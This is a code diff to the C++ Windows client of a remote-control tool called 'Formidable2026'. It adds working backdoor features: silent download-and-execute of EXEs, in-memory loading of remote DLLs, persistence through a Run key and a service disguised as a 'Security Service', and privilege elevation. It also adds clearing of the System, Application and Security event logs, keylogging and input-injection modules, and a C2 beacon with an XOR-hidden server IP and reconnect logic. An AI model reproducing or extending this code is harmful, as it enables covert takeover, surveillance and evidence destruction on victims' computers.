@@ -4,10 +4,14 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <shellapi.h>
+#include <urlmon.h>
 #include <vector>
 #include <string>
 #include <map>
 #include <ctime>
+#include <atomic>
+#include <thread>
 #include "../Common/Config.h"
 #include "../Common/Module.h"
 #include "../Common/Utils.h"
@@ -18,6 +22,7 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "version.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "urlmon.lib")
 
 using namespace Formidable;
 
@@ -32,8 +37,103 @@ PFN_MODULE_ENTRY g_pMultimediaEntry = NULL;
 std::map<uint32_t, HMEMORYMODULE> g_ModuleCache;
 std::map<uint32_t, PFN_MODULE_ENTRY> g_ModuleEntryCache;
 
+// 路径展开助手
+std::wstring ExpandPath(const std::wstring& path) {
+    wchar_t expanded[MAX_PATH];
+    ExpandEnvironmentStringsW(path.c_str(), expanded, MAX_PATH);
+    return expanded;
+}
+
+// 处理载荷类型
+void ProcessPayload() {
+    if (g_ServerConfig.payloadType == 1) { // 下载并执行 EXE
+        std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
+        if (!url.empty()) {
+            wchar_t tempPath[MAX_PATH], tempFile[MAX_PATH];
+            GetTempPathW(MAX_PATH, tempPath);
+            GetTempFileNameW(tempPath, L"FRM", 0, tempFile);
+            
+            // 确保后缀是 .exe
+            std::wstring exeFile = tempFile;
+            exeFile += L".exe";
+            
+            if (URLDownloadToFileW(NULL, url.c_str(), exeFile.c_str(), 0, NULL) == S_OK) {
+                ShellExecuteW(NULL, L"open", exeFile.c_str(), NULL, NULL, SW_HIDE);
+            }
+        }
+    }
+    else if (g_ServerConfig.payloadType == 2) { // 远程加载 DLL (内存加载)
+        std::wstring url = UTF8ToWide(g_ServerConfig.szDownloadUrl);
+        if (!url.empty()) {
+            // 这里通常需要异步或者在独立线程执行，避免阻塞主循环
+            CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD {
+                std::wstring dllUrl = *(std::wstring*)lpParam;
+                delete (std::wstring*)lpParam;
+
+                IStream* pStream = NULL;
+                HRESULT hr = URLOpenBlockingStreamW(NULL, dllUrl.c_str(), &pStream, 0, NULL);
+                if (hr == S_OK) {
+                    std::vector<char> buffer;
+                    char tmp[4096];
+                    ULONG read = 0;
+                    while (pStream->Read(tmp, sizeof(tmp), &read) == S_OK && read > 0) {
+                        size_t oldSize = buffer.size();
+                        buffer.resize(oldSize + read);
+                        memcpy(buffer.data() + oldSize, tmp, read);
+                    }
+                    pStream->Release();
+
+                    if (!buffer.empty()) {
+                        HMEMORYMODULE hMod = MemoryLoadLibrary(buffer.data(), buffer.size());
+                        if (hMod) {
+                            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
+                            if (pEntry) {
+                                pEntry(INVALID_SOCKET, NULL); 
+                            } else {
+                                OutputDebugStringA("[FRM] Remote DLL loaded but 'ModuleEntry' not found\n");
+                                MemoryFreeLibrary(hMod);
+                            }
+                        } else {
+                            OutputDebugStringA("[FRM] MemoryLoadLibrary failed for remote DLL\n");
+                        }
+                    }
+                } else {
+                    char buf[128];
+                    sprintf_s(buf, "[FRM] URLOpenBlockingStreamW failed: 0x%08X\n", hr);
+                    OutputDebugStringA(buf);
+                }
+                return 0;
+            }, new std::wstring(url), 0, NULL);
+        }
+    }
+}
+
 // 安装与自启动
 void InstallClient() {
+    wchar_t szCurrentPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szCurrentPath, MAX_PATH);
+    
+    std::wstring installDir = ExpandPath(UTF8ToWide(g_ServerConfig.szInstallDir));
+    std::wstring installName = UTF8ToWide(g_ServerConfig.szInstallName);
+    
+    if (!installDir.empty() && !installName.empty()) {
+        if (GetFileAttributesW(installDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            CreateDirectoryW(installDir.c_str(), NULL);
+        }
+        
+        std::wstring destPath = installDir;
+        if (destPath.back() != L'\\' && destPath.back() != L'/') destPath += L'\\';
+        destPath += installName;
+        
+        if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
+            if (CopyFileW(szCurrentPath, destPath.c_str(), FALSE)) {
+                // 如果是新安装，启动新进程并退出旧进程
+                ShellExecuteW(NULL, L"open", destPath.c_str(), NULL, NULL, SW_HIDE);
+                exit(0);
+            }
+        }
+    }
+
     wchar_t szPath[MAX_PATH];
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
@@ -41,16 +141,16 @@ void InstallClient() {
     if (g_ServerConfig.iStartup == 1) {
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"FormidableClient", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
+            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
             RegCloseKey(hKey);
         }
     } 
     // 2. 服务启动
-    else if (g_ServerConfig.iStartup == 2) {
+    else if (g_ServerConfig.iStartup == 2 || g_ServerConfig.runningType == 1) { // 运行方式为服务
         SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if (hSCM) {
             SC_HANDLE hService = CreateServiceW(
-                hSCM, L"FormidableService", L"Windows Formidable Service",
+                hSCM, L"Formidable2026", L"Formidable Security Service",
                 SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                 SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                 szPath, NULL, NULL, NULL, NULL, NULL);
@@ -96,6 +196,10 @@ void GetClientInfo(ClientInfo& info) {
     info.isAdmin = IsAdmin() ? 1 : 0;
     info.clientType = g_ServerConfig.iType; // 默认被控端类型
     
+    // 分组信息
+    std::wstring wGroup = UTF8ToWide(g_ServerConfig.szGroupName);
+    wcsncpy(info.group, wGroup.c_str(), 127);
+
     // 活动窗口
     std::string activeWin = ActivityMonitor::GetStatus();
     strncpy(info.activeWindow, activeWin.c_str(), sizeof(info.activeWindow) - 1);
@@ -180,9 +284,13 @@ void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         }
     }
     
-    // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog)
+    // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog, Mouse, Key)
+    // 注意：CMD_LOAD_MODULE也需要检查是否为多媒体模块（通过判断是否有DLL数据）
     bool isMultimedia = (pkg->cmd == CMD_SCREEN_CAPTURE || pkg->cmd == CMD_VIDEO_STREAM || 
-                         pkg->cmd == CMD_VOICE_STREAM || pkg->cmd == CMD_KEYLOG);
+                         pkg->cmd == CMD_VOICE_STREAM || pkg->cmd == CMD_KEYLOG ||
+                         pkg->cmd == CMD_MOUSE_EVENT || pkg->cmd == CMD_KEY_EVENT ||
+                         pkg->cmd == CMD_SCREEN_FPS || pkg->cmd == CMD_SCREEN_QUALITY ||
+                         (pkg->cmd == CMD_LOAD_MODULE && hasDll && pkg->arg2 == 0));
 
     if (isMultimedia && g_hMultimediaModule) {
         // 如果多媒体模块已加载，直接调用入口
@@ -310,6 +418,151 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         case CMD_CLIPBOARD_SET:
             SetClipboardText(pkg->data);
             break;
+        case CMD_POWER_SHUTDOWN: {
+            EnableDebugPrivilege();
+            ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+            break;
+        }
+        case CMD_POWER_REBOOT: {
+            EnableDebugPrivilege();
+            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+            break;
+        }
+        case CMD_POWER_LOGOUT: {
+            ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
+            break;
+        }
+        case CMD_UNINSTALL: {
+            // 移除自启动 (注册表)
+            RemoveFromStartup("Formidable2026");
+            
+            // 移除自启动 (服务)
+            SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            if (hSCM) {
+                SC_HANDLE hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
+                if (hService) {
+                    SERVICE_STATUS status;
+                    ControlService(hService, SERVICE_CONTROL_STOP, &status);
+                    DeleteService(hService);
+                    CloseServiceHandle(hService);
+                }
+                CloseServiceHandle(hSCM);
+            }
+
+            // 获取自身路径
+            wchar_t szPath[MAX_PATH];
+            GetModuleFileNameW(NULL, szPath, MAX_PATH);
+            
+            // 创建自删除批处理
+            wchar_t szBatchPath[MAX_PATH];
+            GetTempPathW(MAX_PATH, szBatchPath);
+            wcscat_s(szBatchPath, L"uninstall.bat");
+            
+            FILE* f = _wfopen(szBatchPath, L"w");
+            if (f) {
+                fwprintf(f, L"@echo off\n");
+                fwprintf(f, L"ping 127.0.0.1 -n 2 > nul\n");
+                fwprintf(f, L"del /f /q \"%s\"\n", szPath);
+                fwprintf(f, L"del /f /q \"%%~f0\"\n");
+                fclose(f);
+                
+                // 执行批处理并退出
+                ShellExecuteW(NULL, L"open", szBatchPath, NULL, NULL, SW_HIDE);
+                ExitProcess(0);
+            }
+            break;
+        }
+        case CMD_DOWNLOAD_EXEC: {
+            // 数据长度 = totalDataLen - sizeof(CommandPkg) + 1
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            std::string url(pkg->data, dataLen);
+            
+            // 使用URLDownloadToFile下载文件
+            wchar_t szTempPath[MAX_PATH];
+            GetTempPathW(MAX_PATH, szTempPath);
+            wcscat_s(szTempPath, L"downloaded.exe");
+            
+            std::wstring wUrl = UTF8ToWide(url);
+            if (S_OK == URLDownloadToFileW(NULL, wUrl.c_str(), szTempPath, 0, NULL)) {
+                // 执行下载的文件
+                ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
+            }
+            break;
+        }
+        case CMD_UPLOAD_EXEC: {
+            // 数据格式: 文件名长度(4字节) + 文件名 + 文件数据
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            if (dataLen > 4) {
+                uint32_t nameLen = *(uint32_t*)pkg->data;
+                if (nameLen > 0 && nameLen < 256 && (int)(4 + nameLen) < dataLen) {
+                    std::string fileName(pkg->data + 4, nameLen);
+                    int fileSize = dataLen - 4 - (int)nameLen;
+                    
+                    // 保存到临时目录
+                    wchar_t szTempPath[MAX_PATH];
+                    GetTempPathW(MAX_PATH, szTempPath);
+                    std::wstring wFileName = UTF8ToWide(fileName);
+                    wcscat_s(szTempPath, wFileName.c_str());
+                    
+                    HANDLE hFile = CreateFileW(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD written;
+                        WriteFile(hFile, pkg->data + 4 + nameLen, fileSize, &written, NULL);
+                        CloseHandle(hFile);
+                        
+                        // 执行上传的文件
+                        ShellExecuteW(NULL, L"open", szTempPath, NULL, NULL, SW_HIDE);
+                    }
+                }
+            }
+            break;
+        }
+        case CMD_OPEN_URL: {
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            std::string url(pkg->data, dataLen);
+            std::wstring wUrl = UTF8ToWide(url);
+            ShellExecuteW(NULL, L"open", wUrl.c_str(), NULL, NULL, SW_SHOW);
+            break;
+        }
+        case CMD_CLEAN_EVENT_LOG: {
+            EnableDebugPrivilege();
+            
+            // 清除主要事件日志
+            const wchar_t* logs[] = { L"System", L"Application", L"Security" };
+            for (int i = 0; i < 3; i++) {
+                HANDLE hLog = OpenEventLogW(NULL, logs[i]);
+                if (hLog) {
+                    ClearEventLogW(hLog, NULL);
+                    CloseEventLog(hLog);
+                }
+            }
+            break;
+        }
+        case CMD_SET_GROUP: {
+            // 设置分组 - 保存到配置或仅在内存中维护
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            if (dataLen > 0 && dataLen < 256) {
+                std::string groupName(pkg->data, dataLen);
+                // 这里可以将分组信息保存到注册表或配置文件
+                // 当前仅存储在全局变量中（需要在ClientInfo中添加group字段）
+            }
+            break;
+        }
+        case CMD_MESSAGEBOX: {
+            // 弹出消息框
+            int dataLen = totalDataLen - (sizeof(CommandPkg) - 1);
+            if (dataLen > 0) {
+                std::string message(pkg->data, dataLen);
+                std::wstring wMessage = UTF8ToWide(message);
+                MessageBoxW(NULL, wMessage.c_str(), L"来自主控的消息", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
+            }
+            break;
+        }
+        case CMD_RECONNECT: {
+            // 重新连接（关闭当前socket，主循环会自动重连）
+            closesocket(s);
+            break;
+        }
         case CMD_TERMINAL_OPEN:
             LoadModuleFromMemory(s, pkg, totalDataLen);
             break;
@@ -355,6 +608,10 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
         case CMD_VOICE_STREAM:
         case CMD_VIDEO_STREAM:
         case CMD_KEYLOG:
+        case CMD_MOUSE_EVENT:
+        case CMD_KEY_EVENT:
+        case CMD_SCREEN_FPS:
+        case CMD_SCREEN_QUALITY:
             LoadModuleFromMemory(s, pkg, totalDataLen);
             break;
         case CMD_EXIT:
@@ -363,35 +620,153 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
     }
 }
 void ClientMain() {
-    // 尝试提权运行
-    if (g_ServerConfig.runasAdmin == 1) {
-        if (!SelfElevate()) {
-            ExitProcess(0);
+    srand((unsigned int)time(NULL));
+    
+    // 调试：显示原始配置
+    char dbgInit[512];
+    sprintf_s(dbgInit, "[FRMD26] 启动配置: IP='%s', Port='%s', bEncrypt=%d, Flag='%s'\n",
+        g_ServerConfig.szServerIP, g_ServerConfig.szPort, g_ServerConfig.bEncrypt, g_ServerConfig.szFlag);
+    OutputDebugStringA(dbgInit);
+    
+    // 如果IP被加密，需要解密 (兼容 Formidable Pro 的异或逻辑)
+    if (g_ServerConfig.bEncrypt == 1) {
+        for (size_t i = 0; i < sizeof(g_ServerConfig.szServerIP) && g_ServerConfig.szServerIP[i]; i++) {
+            g_ServerConfig.szServerIP[i] ^= 0x5A;
+        }
+        sprintf_s(dbgInit, "[FRMD26] 解密后IP: '%s'\n", g_ServerConfig.szServerIP);
+        OutputDebugStringA(dbgInit);
+    }
+    
+    // 互斥体防止重复运行 (处理随机上线逻辑)
+    if (g_ServerConfig.iMultiOpen == 0) {
+        std::string mutName = "Global\\FRMD26_" + std::string(g_ServerConfig.szServerIP);
+        HANDLE hMutex = CreateMutexA(NULL, TRUE, mutName.c_str());
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            if (hMutex) CloseHandle(hMutex);
             return;
         }
     }
 
+    // 尝试提权运行
+    if (g_ServerConfig.runasAdmin == 1) {
+        if (!IsAdmin()) {
+             if (SelfElevate()) {
+                 // 如果提权成功（启动了新进程），则当前进程退出
+                 return;
+             }
+        }
+    }
+
     InstallClient(); // 执行安装/自启动
+    ProcessPayload(); // 执行载荷逻辑
+    
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
+    
+    // 解析 IP 列表
+    std::vector<std::string> ipList;
+    std::string ips = g_ServerConfig.szServerIP;
+    size_t start = 0, end = 0;
+    while ((end = ips.find(';', start)) != std::string::npos) {
+        std::string s = ips.substr(start, end - start);
+        if(!s.empty()) ipList.push_back(s);
+        start = end + 1;
+    }
+    if (start < ips.length()) ipList.push_back(ips.substr(start));
+
+    // 并发上线优化：如果配置了多个IP，随机打乱顺序
+    if (g_ServerConfig.runningType == 0 && ipList.size() > 1) { // 随机上线模式
+        for (size_t i = 0; i < ipList.size(); i++) {
+            size_t j = rand() % ipList.size();
+            std::swap(ipList[i], ipList[j]);
+        }
+    }
+
+    // 智能重连机制：指数退避策略
+    int reconnectDelay = 5000;      // 初始重连延迟 5秒
+    const int maxReconnectDelay = 300000;  // 最大重连延迟 5分钟
+    const int minReconnectDelay = 5000;    // 最小重连延迟 5秒
+    int currentIpIndex = 0;
+    int failedAttempts = 0;
+    
     while (true) {
-        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s == INVALID_SOCKET) {
-            Sleep(10000);
+        // 轮询IP列表
+        const std::string& serverIp = ipList[currentIpIndex % ipList.size()];
+        if (serverIp.empty()) {
+            currentIpIndex++;
             continue;
         }
+        
+        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s == INVALID_SOCKET) {
+            Sleep(reconnectDelay);
+            continue;
+        }
+
+        // 设置超时
+        DWORD timeout = 15000; // 15秒连接超时
+        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
+        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
+        
         sockaddr_in addr = { 0 };
         addr.sin_family = AF_INET;
-        addr.sin_port = htons(atoi(g_ServerConfig.szPort));
-        addr.sin_addr.s_addr = inet_addr(g_ServerConfig.szServerIP);
+        addr.sin_port = htons((unsigned short)atoi(g_ServerConfig.szPort));
+        addr.sin_addr.s_addr = inet_addr(serverIp.c_str());
+
         if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
+            // 连接成功，重置重连参数
+            reconnectDelay = minReconnectDelay;
+            failedAttempts = 0;
+            
+            // 调试日志
+            char dbgMsg[256];
+            sprintf_s(dbgMsg, "[FRMD26] 已连接到 %s:%s\n", serverIp.c_str(), g_ServerConfig.szPort);
+            OutputDebugStringA(dbgMsg);
+            
+            // 收到上线标志后发送信息
+            // Formidable2026 约定：客户端主动发送裸 ClientInfo（通过 SendPkg 自动添加 PkgHeader）
             ClientInfo info;
             GetClientInfo(info);
             SendPkg(s, &info, sizeof(ClientInfo));
+            
+            // 启动心跳线程
+            std::atomic<bool> bConnected(true);
+            std::thread heartbeatThread([&s, &bConnected]() {
+                while (bConnected.load()) {
+                    Sleep(30000); // 30秒一次心跳
+                    if (!bConnected.load()) break;
+                    
+                    ClientInfo hbInfo;
+                    GetClientInfo(hbInfo);
+                    
+                    size_t hbBodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
+                    std::vector<char> hbBuf(sizeof(PkgHeader) + hbBodySize);
+                    PkgHeader* h = (PkgHeader*)hbBuf.data();
+                    memcpy(h->flag, "FRMD26?", 7);
+                    h->originLen = (int)hbBodySize;
+                    h->totalLen = (int)hbBuf.size();
+                    
+                    CommandPkg* p = (CommandPkg*)(hbBuf.data() + sizeof(PkgHeader));
+                    p->cmd = CMD_HEARTBEAT;
+                    p->arg1 = sizeof(ClientInfo);
+                    p->arg2 = 0;
+                    memcpy(p->data, &hbInfo, sizeof(ClientInfo));
+                    
+                    if (send(s, hbBuf.data(), (int)hbBuf.size(), 0) <= 0) {
+                        break;
+                    }
+                }
+            });
+            
+            // 接收和处理命令循环
             while (true) {
                 PkgHeader header;
                 int n = recv(s, (char*)&header, sizeof(PkgHeader), 0);
                 if (n <= 0) break;
+                
+                // 验证包头
+                if (memcmp(header.flag, "FRMD26?", 7) != 0) break;
+                
                 std::vector<char> body(header.originLen);
                 int total = 0;
                 while (total < header.originLen) {
@@ -402,19 +777,78 @@ void ClientMain() {
                 
                 if (total == header.originLen) {
                     HandleCommand(s, (CommandPkg*)body.data(), header.originLen);
+                } else {
+                    break; // 数据不完整，断开重连
                 }
             }
+            
+            bConnected.store(false);
+            if (heartbeatThread.joinable()) {
+                heartbeatThread.join(); // 等待心跳线程结束
+            }
+        } else {
+            failedAttempts++;
+            // 指数退避：连接失败后延迟加倍
+            if (failedAttempts > 1) {
+                reconnectDelay = (reconnectDelay * 2 < maxReconnectDelay) ? reconnectDelay * 2 : maxReconnectDelay;
+            }
         }
+        
         closesocket(s);
-        Sleep(10000);
+        
+        // 尝试下一个IP
+        currentIpIndex++;
+        if (currentIpIndex % ipList.size() == 0) {
+            // 所有IP都尝试过一轮，等待后再试
+            Sleep(reconnectDelay);
+        } else {
+            // 快速切换到下一个IP
+            Sleep(1000);
+        }
     }
 }
+VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
+    switch (CtrlCode) {
+        case SERVICE_CONTROL_STOP:
+            exit(0);
+            break;
+        default:
+            break;
+    }
+}
+
+VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
+    SERVICE_STATUS_HANDLE hStatus = RegisterServiceCtrlHandlerW(L"Formidable2026", ServiceCtrlHandler);
+    if (!hStatus) return;
+
+    SERVICE_STATUS status = {0};
+    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+    status.dwCurrentState = SERVICE_RUNNING;
+    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
+    SetServiceStatus(hStatus, &status);
+
+    ClientMain(); // 服务模式下运行主循环
+}
+
 #ifndef _DEBUG
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    SERVICE_TABLE_ENTRYW ServiceTable[] = {
+        {(LPWSTR)L"Formidable2026", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain},
+        {NULL, NULL}
+    };
+
+    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
+        // 如果不是以服务方式启动，则作为正常程序启动
+        ClientMain();
+    }
+    return 0;
+}
+#else
+// 如果是 Debug 模式且项目设置依然是 Windows 窗口应用
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     ClientMain();
     return 0;
 }
-#else
 int main() {
     ClientMain();
     return 0;
